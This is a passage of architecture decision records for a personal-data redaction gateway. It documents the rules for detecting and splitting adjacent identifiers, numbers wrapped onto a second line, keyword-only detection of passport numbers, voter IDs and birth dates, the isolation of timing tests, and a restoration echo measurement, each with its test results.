| HEAD                |                                                                               | 29                                                                                             |
| C3 + J1 (approved)  | containing span; joined digits                                                | 24                                                                                             |
| + L                 | rule 2 counts letters and digits only                                         | 28 (L alone moves which reading wins)                                                          |
| + T                 | a loser keeps what no winner covers                                           | 14                                                                                             |
| + G                 | a JWT may start after `-`                                                     | 5                                                                                              |
| + K                 | chain a match from the end of the previous one                                | 4                                                                                              |
| A instead of K, + W | email and UPI read outwards from every `@`; a key takes the rest of its token | **0**                                                                                          |
| + N (rejected)      | NUMBER widened over space-joined digits                                       | 0; joined-digits 30/30, but 5 → 4,893 other digits redacted in 200 `<id> <qty> <price>` tables |

The user chose all seven (C3, J1, L, T, G, A, W), N rejected, 2026-10-01.

**Decision:**

1. **L (ADR-003 rule 2):** "the longer span" counts letters and digits,
   not code units (`SizeOf` in `overlap.ts`, a prefix-sum count in
   `resolve.ts`). A window straddling two mobiles across `-` no longer
   outweighs either mobile.
2. **C3, containing span** (`resolve.ts`): after the plain rule, a
   candidate that lost but wholly contains every winner it touches
   replaces them, longest first. A replacement is never replaced: a later
   loser is no longer, so cannot contain it. It counts as validated when it
   holds a validated value of its own type (an unvalidated card window
   holding a validated card stays "validated").
3. **T, remainders** (`resolve.ts`): every other loser keeps the part of
   its text no kept detection covers, best-ranked loser first, as a
   detection of its type; at a cut, characters other than letters and
   digits stay text (as ADR-028). Digits in a run a kept detection touches
   are left to widening, so one 16-digit number read as two overlapping
   Aadhaars stays one detection.
4. **J1, joined digits** (`number.ts`, ADR-011 amendment): digits joined by
   a joiner (dot, hyphen, dash, bracket, `+`) to a claimed span are a
   NUMBER however few, except next to an address no single host owns.
5. **A** (`email.ts`, `upi.ts`, ADR-024 amendment): an email or UPI
   candidate at every `@`, its local part or name read leftwards as far as
   its characters go, its domain or handle rightwards. Neither crosses
   another `@`, so this is linear. On 300,000 random texts the old
   detectors' candidates were all still found; every added one was in a
   token with a second `@`.
6. **G** (`secret.ts`, ADR-022 amendment): a JWT may start after `-`
   (`<value>-eyJ…`), still never after a dot or glued to a letter. Found by
   splitting each run of base64url characters and dots at its dots once,
   not by a pattern that would restart at every hyphen.
7. **W** (`secret.ts`, ADR-022 amendment): a key in a known format takes
   the rest of the token it is glued to (letters, digits, marks, `_`, `-`,
   dot-joined parts), like the safety net's whole-token rule; the search
   resumes after it, so a chain of keys is read once.

All of it is linear or near-linear (Fenwick tree for replacements, each
position painted once for remainders); eight new fail-fast timing tests.

**Measured** (HEAD → now):

|                                                                                      | HEAD              | Now                                                                                                                        |
| ------------------------------------------------------------------------------------ | ----------------- | -------------------------------------------------------------------------------------------------------------------------- |
| Pair probe rows with a leak (every type × every type × 4 separators)                 | 29 (2,626 values) | **0**                                                                                                                      |
| Eval main set                                                                        |                   | unchanged                                                                                                                  |
| Shape block contained                                                                | 0/70 (70 partly)  | 70/70                                                                                                                      |
| Shape block joined-digits                                                            | 6/30 (24 partly)  | 21/30 (9 partly: a lone digit and a space before the number)                                                               |
| Shape block contained, over-redactions                                               | 8                 | 9 (a tracking number HEAD already redacted with a PHONE reaching into the neighbouring secret; now a detection of its own) |
| Held-out set                                                                         |                   | unchanged                                                                                                                  |
| Merges, `<mobile> - <mobile>` / `<mobile>. <mobile>` (100 pairs)                     | 53 / 36           | 0 / 0                                                                                                                      |
| Merges in the generated set (main + shape)                                           | 28                | 20                                                                                                                         |
| Plain text (12 kinds), amount tables (9 layouts), bug-34 shapes, multi-line messages |                   | unchanged                                                                                                                  |

**Consequences:**

- Bug 35 is closed: no letter or digit of any value is sent when two
  values of any types are written side by side with a space, `-`, `. `
  or `-`. The no-leak test plants such pairs with no exception, and a
  `detect.test.ts` grid checks every type pair with every separator.
- Where values are glued, the split point follows the rules, not intent:
  `a@example.com-b.c@example.org` may become `[EMAIL_1]@[EMAIL_2]`, the longer reading
  winning; two hyphen-joined keys and two unbroken numbers joined by `-`
  are one placeholder each. Nothing is sent; the model may see an odd split.
- An email or UPI ID with a checked value inside it is typed as the email
  or UPI ID, not as the checked value (PAN, IFSC, phone).
- Known limit kept (N rejected): a lone digit and a space before a long
  number stay visible.

**Mutation checks:** 33, with the committed runner. **32 caught**, 7 only
after a test was added (R12, R14, J2, E1, E3, S2, S5); **R15 equivalent**
(a remainder with no letter or digit is always emptied by trimming from
its cut), so the check was simplified to `stop > start`. D1, R9, J1, S1
and S3 also fail the no-leak test. The testing guide has the table.

<a id="adr-030"></a>

## ADR-030: Numbers wrapped onto the next line (amends ADR-010, ADR-013, ADR-014)

**Context:** ADR-014's known gap: a number with a line break between its
digit groups (`4111 1111`, newline, `1111 1111`) was not detected at all.
Each half is below the safety net's 9 digits, and digit runs join only
across spaces, dots and dashes. Phase 5c item 4. The 5c proposal measured
seven rules (L1 to L7) on copies of `src/detection`; the user approved L7
(2026-10-01): two digit runs separated by one line break (LF or CRLF, with
or without a space before it) are tried as one number; Aadhaar and card
follow today's rule (checksum, or a keyword nearby); a joined phone always
needs a keyword; same-line results must not change. Its measurement: one
line break per generated value, Aadhaar 153/153, card 149/153, phone
104/153; 19 detections in 2,400 multi-line messages with nothing personal.

**Questions decided while building** (each measured on copies of
`src/detection` in the session scratchpad, then put to the user):

1. _What "same-line results must not change" means._ Read strictly (a
   cross-line candidate is dropped when it overlaps any candidate found
   within a line), it left part of 33 wrapped values in the probe visible:
   an Amex's first line (`#### ######`) passes as a valid landline, and the
   guard then kept the last five digits out of every detection. One line
   break per value: Aadhaar 137, card 139, phone 103; shape row 105/120
   with 7 partly. Without the guard, cross-line candidates go through the
   ordinary overlap rules (ADR-003, ADR-029): Aadhaar 153, card 149, phone
   107 (the approved numbers; phone gained from items 1 to 3), shape row
   112/120 with 0 partly, and the same plain-text cost. **The user chose
   "compete normally"**: texts with no line break give identical results
   (434 checked, and by construction), nothing found today is left
   visible (9,073 texts), and where a cross-line value contains a
   same-line detection, the detection grows to the whole value (149 texts:
   PHONE to CARD 96, PHONE to AADHAAR 47, AADHAAR to CARD 18).
2. _A cost the proposal had not probed:_ a list of 6-digit numbers, one
   per line (PIN codes, amounts), gives 70 detections in 55 of 200
   messages: two such lines make a 12-digit number that passes the
   Aadhaar checks about 1 time in 11. Requiring a keyword for a wrapped
   number written without spaces (two unbroken groups) would remove it,
   at a cost of 13 Aadhaar and 13 card values in the probe and 3 in the
   shape row. **The user kept today's rule**; the cost is in the README.
3. _Neighbours (bug-log 40)._ The no-leak test, given wrapped values,
   failed: a wrapped value with any other number in the same digit run on
   one of its lines (a digit before it, a group or `24x7` after it, a
   second value joined by a space or `-`) was never found, because the
   approved rule takes only whole runs and the digit count is then wrong
   (300 of 300 per shape for Aadhaar and card). Measured: P (windows of
   the last groups of one line and the first groups of the next, layouts
   required unless both runs are whole), P2 (P, two unbroken groups also
   inside longer runs: 3 earlier detections left partly uncovered,
   rejected), P3 (P, one of the two runs taken whole). P and P3 find every
   neighbour shape except an unspaced Aadhaar (6 / 6) beside another
   number; costs: two 4-digit codes per line 21 → 124 detections (98 of
   200 messages), three 4-digit codes per line 96 → 155 (P: 286).
   **The user chose P3.**

**Decision:**

1. **The gap** (`LINE_BREAK_GAP` in `digit-runs.ts`): between two digit
   runs, at most two separators (space, dot, hyphen, dash), one line break
   (LF or CRLF), at most two spaces. Nothing else: a blank line, a lone CR,
   U+2028/U+2029, a tab, three spaces of indent, a bullet or a word means
   two numbers. `lineJoins` pairs neighbouring runs; a run can be in two
   pairs.
2. **Windows** (`crossLineWindows`): the last groups of the first line's
   run and the first groups of the second line's, with at least one of
   the two runs taken whole. `lineJoinedWindows` adds `digitWindows`' glue
   rules where a window reaches a run's outer end.
3. **Aadhaar and card** (`aadhaar.ts`, `card.ts`): a window counts if it
   is grouped like one of the type's layouts, or is the whole of both runs
   as two unbroken groups (a number written without spaces and wrapped;
   `wrapsAlone`). Validated exactly as on one line; otherwise a keyword is
   needed (ADR-010).
4. **Phone** (`phone.ts`): windows of 7 to 15 digits, with a `+` in front
   when the window starts its run, read by libphonenumber (POSSIBLE, which
   includes VALID) with the line break as a space; the match must be the
   whole window. Always unvalidated: a phone keyword is needed. A window
   that wholly holds a _valid_ phone found within a line is skipped unless
   it starts with `+` (bug-log 41: `Flat 12`, newline, `<mobile>` would
   otherwise replace the mobile and take the flat number; `+1`, newline,
   `<number>` keeps its country code; a merely possible first line such as
   `98765 432` does not stop the window over the whole mobile).
5. **Overlaps:** cross-line candidates take part in the ordinary rules
   (question 1). A validated same-line reading still beats an unvalidated
   cross-line one: a wrapped mobile whose second half and a group after
   it read as a valid phone becomes two placeholders, nothing visible.
6. **Value key** (`redact.ts`, ADR-013 amendment): a phone's line breaks
   are read as spaces before libphonenumber parses it (it parses nothing
   with a line break in it), so a wrapped mobile and the same mobile on
   one line share one placeholder. Aadhaar and card keys were digits only
   already.

**Measured** (HEAD → now; probe = every generated Aadhaar, card and phone
of the main cases with one line break put into it, 153 each):

|                                                                                         | HEAD                                                           | Now                                         |
| --------------------------------------------------------------------------------------- | -------------------------------------------------------------- | ------------------------------------------- |
| Probe, one LF per value                                                                 | Aadhaar 0 (16 partly), card 10 (10 partly), phone 0 (6 partly) | Aadhaar 153, card 150, phone 107 (2 partly) |
| Probe, broken inside a group (LF, CRLF, space + LF)                                     | Aadhaar 0/70, card 3/56, phone 0/125                           | 70/70, 56/56, 89/125                        |
| Probe, wrapped at a space (each break)                                                  | Aadhaar 0/83, card 7/97, phone 0/28                            | 83/83, 94/97, 18/28 (2 partly)              |
| Shape block line-break                                                                  | 11/120 (7 partly)                                              | 113/120 (0 partly; right type 112)          |
| Eval main set, held-out set                                                             |                                                                | unchanged                                   |
| Neighbour shapes (wrapped Aadhaar 4-4/4, card, phone with keyword; 6 shapes × 300 each) | whole runs only: 300 of 300 Aadhaar and card missed per shape  | 0 missed                                    |
| Wrapped Aadhaar 6/6 beside another number                                               | missed                                                         | missed (known gap)                          |

The shape row's 7 misses: 3 phones with no keyword and 4 values with a
typo and no keyword, both by design. The probe's phone misses are the
same (no keyword in the sentence); its 2 partly redacted phones are `+1`,
newline, a North American number with no keyword: the number is
redacted, the country code `+1` is sent.

Costs, as detections in 200 messages of text with nothing personal
(HEAD → now): two 4-digit codes per line 0 → 124 (98 messages), the same
with CRLF 1 → 112; three 4-digit codes per line 96 → 155; one 6-digit
number per line 0 → 70 (55 messages); one 5-digit number per line under
a line with "phone" 0 → 539 (all 200). Unchanged: statement rows, log
lines, lists of 4-digit codes or amounts one per line, line items,
addresses with a PIN code, numbered steps, dates, every amount-table
layout of ADR-027, amounts with commas. The 2,400 plain multi-line
messages: 274 → 398 detections.

**Consequences:**

- A number wrapped by a mail client or a narrow chat window is redacted
  like the same number on one line, with a number beside it or not.
- Lists of short codes, two or three to a line, and lists of 6-digit
  numbers pay in over-redaction (README known costs).
- Known gaps, each pinned by a test (`line-break.test.ts`): an unspaced
  12-digit number wrapped 6 / 6 with another number beside it; a group
  broken across the line inside a spaced number (`2345 67`, newline,
  `89 0123`); both lines with a neighbour; a blank line, three spaces of
  indent or a bullet between the halves; three or more lines; a phone or
  a value with a typo and no keyword.
- **Values split across two messages stay undetected** (Phase 5c's
  original item 2, documentation only): each message is detected on its
  own, as ADR-014 says. The shape block publishes its recall (0/60, 2
  partly). Joining neighbouring messages was measured in the proposal
  (no detection crossed a join in the generated chats) and stays rejected
  for ADR-021's reason: appending a message could change how an earlier
  one was redacted, which breaks "appending never renumbers".
- Timing: linear, one libphonenumber call per window (at most a few per
  line join); three fail-fast timing tests, sized from one timed run
  each.

**Mutation checks:** 30, with the committed runner (the testing guide has
the table). **29 caught**, three only after a test was added (A2 and C2:
whole runs in an unusual grouping, such as rows of 3-digit codes, judged
like one-line runs; H3: unvalidated one-line phones stopping a window).
G5, G7, G13, G14, A1, C1, P2 and P4 also fail the no-leak test. **P5
survives** (any phone inside the window, not only a whole match): on
100,000 fuzzed two-line texts with a phone keyword it differs from the
final code in 2,918, only in how digits are grouped into placeholders or
by covering more (703: a lone `+<digits>` line, or digit groups beside a
phone on the other line, merged into it), never fewer. Writing the test
it should fail found bug 41.

**Follow-up (2026-10-02, before ADR-031): P5 caught.** The test labelled
"(mutation P5)" (`Flat 12`, newline, a mobile) is stopped by `holdsOne`
first (it is H1's test; comment corrected). A window starting with `+`
skips that check, so a new test pins the intended span there: `Call
+12345`, newline, `00000-11111` (no valid value in it; the second line
is a possible number on its own). The real code gives one unvalidated
PHONE over the second line and no wrapped candidate; the mutant stretches
it over `+12345`. Re-run with the committed runner: caught, 1 test, by
"is the whole window or nothing". Item 4's mutation score is now 30 of 30.

---

<a id="adr-031"></a>

## ADR-031: Passport numbers, voter IDs and dates of birth — keyword only (amends ADR-003, ADR-009, ADR-013, ADR-018)

**Context:** Phase 5c item 5, the last 5c item. ADR-021's known gap: a
passport number (a letter and 7 digits), a voter ID (EPIC: 3 letters and 7
digits) or a date of birth has no detector and is below the safety net's 9
digits. The shape block's `short-id` row (459 values, 153 of each, among
lookalikes of the same shapes) measured 1/459 redacted, 0 with the right
type. The user's brief: three new types, **keyword only** ("shapes alone
never count, since every invoice, order or ticket code of that shape
would be redacted"); update the streaming hold-back, the variant grammar,
restoration, the overlap priority, the no-leak and canary tests; report
the short-id row and the false positives on dates and codes that are not
personal.

**Decision:**

1. **Three detectors**, each in its own file, each candidate **never
   validated**, so ADR-010's policy makes the keyword a requirement:
   - `passport.ts`: `[A-Za-z][0-9]{7}`, any case.
   - `voter.ts`: `[A-Za-z]{3}[0-9]{7}`, any case.
   - `dob.ts`: four forms, each a real calendar date (month lengths, leap
     years, a four-digit year 1900–2099, any two-digit year): day, month,
     year with one separator throughout (`/`, `-`, `.`; day-first or
     month-first, whichever makes a real date); year first; day and month
     name (`7 March 1991`, `07-Mar-91`, `7th March, 1991`, `07Mar1991`);
     month name and day (`March 7, 1991`). Month names in English, full,
     three letters, or "Sept"; any number of spaces or one hyphen around a
     month name (bug-log 42).

   Not glued to a letter, digit, mark or underscore (passport and voter
   ID: or `@`, as PAN and IFSC). A date is also not taken from inside a
   longer dotted or slashed number (`2.7.3.1991`, `12/07/03/1991`); a
   hyphen and a digit beside it do not stop it (see the questions below).

2. **Keywords** (`context.ts`, the usual 40 characters on either side):
   PASSPORT `passport`, `passports`, पासपोर्ट; VOTER `voter`, `voters`,
   `epic`, मतदाता, वोटर; DOB `dob`, `d.o.b`, `birth` (covers "date of
   birth", "birth date"), `birthdate`, `birthday`, `born`, जन्म (covers
   जन्म तिथि), जन्मतिथि, `janm`, `janam`. Not taken: "age" ("age proof"
   names a document showing a date of birth, but "age" sits in too many
   sentences with a date in them), "ID card" (any card), "visa" (below).
3. **Priority** (ADR-003 amendment): `… > IFSC > VOTER > PASSPORT > DOB >
PHONE > …`. The only tie seen is DOB and PHONE on a dashed or dotted
   date, which libphonenumber reads as a possible number.
4. **Value keys** (ADR-013 amendment): passport and voter ID in capitals,
   like PAN and IFSC; a date of birth as written, lower-cased, runs of
   spaces read as one. Not a calendar key: `03/07/1991` is 3 July or 7
   March depending on the writer, so another spelling is another value.
5. **Restoration** (ADR-013 amendment): bracketed and bare-underscore
   forms for all three, as for every type. **No bare-space form**:
   "Passport 1 of 2", "Voter 1" and a form's "DOB 1" (the first
   applicant's) are ordinary text. `BARE_SPACE_NAMESPACES` stays AADHAAR
   and LITERAL.
6. **Hold-back** (ADR-018 amendment): `MAX_HELD_BACK` is 16, the length
   of `[PASSPORT_9999].`; it was already computed from the longest tag,
   so only the tests and documents pinning 15 changed. The undecided-text
   patterns gained the new tags' prefixes by construction (`V`, `Vo`…,
   `D`, `Do`…), so a stream may now hold back a trailing "V" or "D" until
   the next chunk.
7. **ADR-009 extends** to passport and voter ID numbers: generated in
   memory, never typed into files. `repo-hygiene.test.ts` fails on a
   passport or voter ID shape with its keyword on the same line (the
   held-out file is left to its own lint, which has the `typed-id` rule).
   A typed date is not checked: a date with no name beside it identifies
   nobody, and the cost tests type ordinary dates next to birth words on
   purpose. Tests that pair a keyword with a date of birth generate it.

**Questions decided while building:**

- _"visa" for PASSPORT:_ it finds 9 more passports in the short-id row
  (93 → 102 of 153) and no new over-redaction in the generated set, but
  the only sentence it helps is one I wrote ("Please verify … for my
  visa"), and it is CARD's keyword for the card network. Not taken; the
  measurement is here if real text argues otherwise.
- _A keyword licensing only its nearest value_ would remove the record
  cost below (`DOB: <dob> Joined: <date>`), but would leave the second
  value of `Passport numbers: <a> and <b>` visible. Not taken: detection
  fails closed (ADR-010 amendment). The window is ADR-010's, unchanged.
- _A hyphen next to a date_ (found by reading while writing the no-leak
  planting, before any test ran): the first rule refused a date followed
  by `-` and a digit, as "part of a longer number". But a hyphen is one
  of the four ways two values are written side by side (ADR-029), and in
  `DOB: <date>-<Aadhaar>` the date was then not found and its day and
  month were sent: in a probe of 6 neighbours × 4 separators × 2 orders ×
  200, the four `<date>-<number>` layouts left date digits visible in 79
  to 86 of 200 (the numeric forms). Now only `.` or `/` and a digit mean
  "longer number"; digits joined by a hyphen are widening's and the
  safety net's (ADR-028, ADR-029 J1). After: 0 in all 48 layouts. Not in
  the bug log: found by reading, not by a failure.

**Measured** (generated set; HEAD → now):

|                                                 | HEAD                                                     | Now                                                                                                                          |
| ----------------------------------------------- | -------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------- |
| Shape block `short-id`, redacted (any type)     | 1/459                                                    | 305/459                                                                                                                      |
| … right type                                    | 0/459                                                    | 304/459                                                                                                                      |
| … PASSPORT / VOTER / DOB, right type            | 0 / 0 / 0 of 153 each                                    | 93 / 103 / 108 of 153                                                                                                        |
| … over-redactions                               | 0                                                        | 25                                                                                                                           |
| Main cases (every type, every over-redaction)   |                                                          | unchanged                                                                                                                    |
| Every other shape row                           |                                                          | unchanged                                                                                                                    |
| Held-out set (reporting only, not investigated) | NUMBER redacted 3/6; no PASSPORT, VOTER or DOB detection | NUMBER redacted 5/6; one PASSPORT and one VOTER detection on values labelled otherwise; one DOB over-redaction in plain text |

The misses are by design: each type's generated sentences include ones
that name no type ("Document … expired last month", "ID card … is
attached", "The age proof says …"), while records use the type's field
name, which is a keyword. The one DOB redacted with the wrong type is a
date in a sentence with no birth word and a phone word nearby, read as a
possible phone (HEAD's one redacted value). The 25 over-redactions, all
in messages that also hold a real value with its keyword: model codes
(a letter and 7 digits) 8, ticket codes (`T` and 7 digits) 2, invoice
codes (`INV` and 7 digits) 5, order codes (`ORD`/`TXN`/`REF` and 7
digits) 3, event dates in the 1900s 4, and 3 order dates in a filler
sentence ("I ordered it on …/2026") within 40 characters of a birth word.

**False positives on dates and codes that are not personal** (probe,
200 synthetic messages per layout, detections of the three types):

| Layout                                                                         | Detections                     |
| ------------------------------------------------------------------------------ | ------------------------------ |
| Invoice line: `Invoice INV<7> dated <date>, order ORD<7>, model X<7>.`         | 0                              |
| Order mail: `Your order ORD<7> placed on <date> ships by <date>. Ticket T<7>.` | 0                              |
| Log line: `<date> 10:4x INFO job JOB<7> done, build B<7>`                      | 0                              |
| Every keyword in the message, but more than 40 characters away                 | 0                              |
| `DOB: <dob> Joined: <date>`                                                    | the joining date in 200 of 200 |
| `Passport no: <passport> Ticket: T<7>`                                         | the ticket code in 200 of 200  |
| `Voter ID: <voter ID> Order: ORD<7>`                                           | the order code in 200 of 200   |
| `Our brand was born in Pune. Offer valid till <date>.`                         | 200 of 200                     |
| `That was an epic deal: order ORD<7> is confirmed.`                            | 200 of 200                     |
| `Passport size photo attached, model X<7>.`                                    | 200 of 200                     |

**Consequences:**

- Passport numbers, voter IDs and dates of birth next to a word naming
  them are redacted; without one, they are sent as written, by design.
- The cost is local and total: a code or date of the same shape within
  40 characters of a keyword is redacted too, every time (a record's next
  field, "born", "epic" or "passport size" in prose). With no keyword
  nearby, shapes cost nothing. README known costs.
- Known gaps, each pinned by a test: a passport number with a space after
  its letter; older voter ID formats (not matched by the shape); a date
  without its year, with spaces around a numeric date's separators, or
  with a time glued to it (`1991-03-07T10:00`); month names in other
  languages.
- Timing: linear; ten fail-fast timing inputs (two each for passport and
  voter ID, six for dates), each timed once before
  its size was chosen (the dotted-digit input costs the IP and safety-net
  detectors about 25 ms per thousand characters and DOB under 1 ms, so it
  is sized 1,500).
- 5c is complete. Values split across two messages stay undetected and
  documented (ADR-030), their recall published in the shape block.

**Mutation checks:** 47, with the committed runner (the testing guide has
the table). **47 caught**, each by a test aimed at it (read from the
failed-test list, timing tests left out): the shapes and glue rules of
both ID types, every date rule (calendar, year range, separators, the
hyphen rule both ways, ordinals, "Sept", month names told apart by their
third letter, spacing), each new keyword, the DOB-over-PHONE order, the
value keys, the bare-space decision, the hygiene check, and each detector
switched off (both no-leak blocks fail). Three tests were added before the
run, from reading the list: June/July and March/May dates, two different
passports in the value-key test, and the DOB/PHONE tie. During PP6 and
PP7 the machine was busy (VS Code, Chrome): 6 and 58 unrelated timing
tests failed as well, and PP7's run took 565 s; their verdicts come from
the passport tests that failed with them (the 5d "timing tests under
load" item).

---

<a id="adr-032"></a>

## ADR-032: Timing tests in their own project, run after the rest (Phase 5d part 2)

**Context.** The growth-ratio tests (`test/support/linear-time.ts`) failed
on a busy machine: ratios over 8 for linear code (bug-log 20, 21, the
"also seen" notes), two unexplained timeouts (IFSC 31.4 s, stream-restore
38.7 s), and dozens of failures during 5c's slow spells. Before CI they had
to become reliable. Measured on 2026-10-02 (i5-12450H, 12 logical CPUs:
8 performance threads, 4 efficiency cores; Balanced plan, mains power),
every one of the 89 growth-ratio calls logged with all five run times, and
a fixed speed probe (15 ms quiet) every 2 s:

| Condition                              | Runs | Calls | Max ratio | Fails (≥ 8)      | First reading ≥ 8 | Longest call | Probe median / max |
| -------------------------------------- | ---- | ----- | --------- | ---------------- | ----------------- | ------------ | ------------------ |
| Timing files, one at a time            | 3    | 267   | 6.89      | 0                | 0                 | 8.0 s        | 35 / 171 ms        |
| One at a time, performance cores only  | 2    | 178   | 5.83      | 0                | 0                 | 3.5 s        | 28 / 49 ms         |
| One at a time, efficiency cores only   | 2    | 178   | 5.37      | 0                | 0                 | 5.2 s        | 22 / 44 ms         |
| Timing files, three at a time          | 3    | 267   | 6.22      | 0                | 0                 | 9.9 s        | 38 / 76 ms         |
| Timing files, 11 at a time             | 3    | 267   | 8.60      | 1                | 14                | 19.2 s       | 48 / 115 ms        |
| Full suite (`npm test` then)           | 5    | 445   | 8.06      | 2 + 4 timeouts   | 64                | 42.8 s       | 77 / 1,314 ms      |
| Full suite, coverage                   | 3    | 267   | 6.58      | 0                | 13                | 28.2 s       | 74 / 192 ms        |
| One at a time beside 2 other suites    | 2    | 178   | 9.86      | 5 + 6 timeouts   | 58                | 44.0 s       | 128 / 909 ms       |
| Overloaded (3 suites, lint, typecheck) | 3    | 265   | 24.98     | 39 + 37 timeouts | 298               | 106 s        | 221 / 2,337 ms     |

The cause: when CPUs are oversubscribed, a short run (the small input,
2 ms) often finishes inside one time slice, a long one never does, and
the fastest of five keeps the lucky short run. In the inflated readings
the large input slowed 8.3× (full suite) or 15.9× (overloaded), the small
one 2.7× or 3.9×. Core type is not the cause (pinned runs were clean,
the two core types differ by 1.23× on fixed work). The timeouts are the
same load: inputs sized for a quiet machine. Separately, the machine has
slow spells of its own: full runs 1 and 2 had the same workload and took
85 s and 159 s, and with no test running the probe once went from 20 ms
to 473 ms.

**Options.** (A) Timing tests in their own project, one file at a time,
after the rest: measured clean, about 130–150 s more. (B) The same, at
most three files at a time: measured clean, about 60–70 s more. (C) Judge
each test against a known-linear reference workload measured alongside it:
not measured, more code. Rejected: CPU time instead of wall time
(`process.cpuUsage()` moves in 15–16 ms steps on Windows), pinning to one
core type (not portable), a higher limit (overloaded ratios reach 25, and
it does nothing for the timeouts).

**Decision.** (B), the user's choice. The 87 growth-ratio tests (89 calls)
moved, names unchanged, into 15 `*.timing.test.ts` files beside the files
they came from, and the helper's own two real-clock tests into a 16th
(bug-log 48): 89 timing tests. `vitest.config.ts` has two projects: `main` (everything
else, `groupOrder: 0`) and `timing` (`maxWorkers` = min(3, CPUs − 1), at
least 1; `groupOrder: 1`, so it starts after `main` ends). `npm test` runs
both; `npm run test:timing` runs only the timing project; `npm run
test:coverage` runs `main` only, which still covers 100% (2,992
statements, 1,611 branches, 742 functions, 2,524 lines), so the timing
tests covered nothing of their own. Timing tests assert with
`expectLinearTime`, whose failure message gives both input sizes, how many
measurements were taken, and every run's time (never an input).
`growthRatio` is unchanged for the helper's own tests.

**Consequences.**

- The timing tests need the machine mostly to themselves. Beside two
  other suites they still fail (row 8); the README and the testing guide
  say so. CI runs on its own VM; part 7 repeats the workflow to check it.
- A mutation that only makes code slower is caught only if its list names
  the `*.timing.test.ts` file (`scripts/mutate.ts` header). Proof: Q1 (no
  path compression in `resolve.ts`'s `find`) failed 1 of 16 tests, the
  timing one, in 5 s.
- The machine's own slow spells are not fixed by this: a heavy main-project
  test (`detect.test.ts`, 2.4 s alone under coverage) timed out at 41 s in
  one coverage run during one.
- Tests elsewhere with a deadline a success must meet use
  `SUCCESS_DEADLINE_MS` (2 s, `test/support/mock-provider.ts`), after one
  failed at 300 ms in the first stability run (bug-log 47).
- "Failed to find the current suite" (5c item 5): not seen in 38 runs;
  still unexplained.

**Amendment (2026-10-02, Phase 5d part 7: CI).** In CI the timing
project runs one file at a time. The "three at a time" above was measured
on a 12-core machine; GitHub's `ubuntu-latest` runner has 4 vCPUs, where
`min(3, CPUs − 1)` would still give 3. The user chose one worker from the
start rather than wait for failures. Mechanism: `vitest.config.ts` reads
`PSEUDONYM_TIMING_WORKERS` (a whole number ≥ 1, otherwise the config
throws); unset, the count is unchanged, so local runs keep three.
`.github/workflows/ci.yml` sets it to `1` on the timing step. The CLI flag
`--maxWorkers=1` was not used: Vitest takes a project's own `maxWorkers`
before the root config's (`resolveMaxWorkers` in Vitest 5.0.2), and the
flag only reaches the root. The timing step is a step of its own in a
single job, so nothing else runs on the runner while it does. Whether this
is stable on GitHub is checked by the user re-running the workflow 3–5
times.

---

<a id="adr-033"></a>

## ADR-033: The echo measurement — what restoration leaves, by rule, and whether everything else comes back (Phase 5d part 3)

**Context.** Restoration safety (the project brief, ADR-018) leaves a placeholder
unrestored in a URL, a markdown link or image target, after `[label]:`, in
a quoted HTML attribute value, after an unclosed `<` target (the rest of
the line) or `="` (the rest of the text), and before a host label (the
host rule). Each of those is a value the user never gets back. The Phase 5
notes asked for how often that happens, the ADR-018 costs separately; the
approved 5d plan (part 3) fixed the method: echo every message of both
datasets back unchanged, count what is left by the rule that held it,
check that everything else round-trips, deterministic and in CI, the
held-out set by rule only.

**Options for the counting.**

- (A) Recompute the rules in the evaluation (regular expressions over the
  echoed text). Rejected: a second copy of the rules that can disagree
  with the scanner, which is what restoration actually runs.
- (B) An optional counter on restoration, fed by the scanner itself.
  Chosen. The cost is code in `src/` that only the evaluation uses, so it
  must provably change nothing.

**Decision.**

1. **Counter.** `restore(text, mapping, options, counts?)` and
   `new StreamRestorer(mapping, options, counts?)` add to a
   `RestoreCounts` (`emptyRestoreCounts()`): `restored`, and per
   `HeldBackRule`: `markdown-destination`, `reference-label`,
   `html-attribute`, `url`, `unclosed-angle`, `unclosed-quote`, `host`,
   `bare-space`. Only placeholders the mapping would restore are counted
   (an unknown placeholder, or a bare form of an exact-only entry, is not
   a placeholder of this request). Properties: the output with a counter
   equals the output without (5,000 runs); counts are the same however the
   answer is cut (bare-space aside); with the safety rules off, `restored`
   grows by exactly what the rules held.
2. **Which rule.** `new UnsafeRegionScanner({ classify: true })` keeps one
   span per construct with its rule (only then: the gateway never passes a
   counter, so it never pays for it); `ruleAt(start, end)` returns the
   first rule in `UNSAFE_RULE_ORDER` among the spans overlapping
   `[start, end)`: markdown destination, reference label, HTML attribute,
   URL, then unclosed `<`, unclosed `="`. The outer construct counts before
   a URL inside it, and the ADR-018 rules last, so they count only what no
   older rule would hold. An angle target is `unclosed-angle` until its
   `>` arrives (then it takes the rule of the `](` or `[label]:` that
   opened it); a quoted value is `unclosed-quote` until its quote closes.
   So a stream classifies the placeholders held by a region at `end()`.
   The host rule is counted by the restorer, and only when no region
   holds the placeholder (region first, as restoration decides). A
   property checks that the classified spans cover exactly the unsafe
   characters. `ruleAt` looks at every span: fine for the evaluation's
   messages, never on a request's path.
3. **`bare-space`.** `Type N` text (`Card 1`, `CARD 1`) of a placeholder the
   mapping holds, in a namespace whose bare-space form is never restored
   (ADR-013), outside a bracket. Counted by `restore()` over the whole text,
   not by a stream (a piece boundary could split one). In an echo it can
   only be the user's own words, left as written; in a model's answer
   (part 4) it is most likely a rewrite.
4. **The echo** (`eval/echo.ts`): per case, redact the messages in order
   with one mapping, then for each redacted message: restore with a
   counter, restore without (must be equal), restore with the safety rules
   off. Every one of Pseudonym's placeholders in the message must be
   either restored or held by a named rule. The message is **back
   exactly** if the rules-off restoration equals the original; **back with
   a later mention as first written** if the rules-off restoration is the
   redacted text with every placeholder replaced by its value, and the
   original is the redacted text with every first mention replaced by its
   value and every later one by any non-empty text (ADR-013: a value
   written again another way restores to its first form; checked over
   every split at once); otherwise **not restored correctly**. Injectable
   restorer and redactor for the tests that show each check can fail.
5. **Thresholds** (`eval/baseline.json`, `compareEcho`): per part (the
   generated set's `main` and each shape; the held-out set as `all`),
   restored higher is better; every held-back rule, later-form messages
   and broken messages lower is better; a part that appears, disappears
   or changes its message count is a changed dataset, which is how the
   first run was recorded (with this ADR as the note). Placeholders and
   exact messages are not thresholds (they move with detection).
6. **Report.** One table in `npm run eval` and the README block, rules as
   rows, columns: generated main cases, `in-markup`, the other shapes added
   up, held-out (one total, never by case).
7. **Dataset.** The `in-markup` shape (ADR-021 amendment of the same day),
   accepted first with detectors and restoration unchanged.

**Measured (2026-10-02).** Generated main: 600 messages, 1,667
placeholders, 1,660 restored, 7 left (all IP addresses in
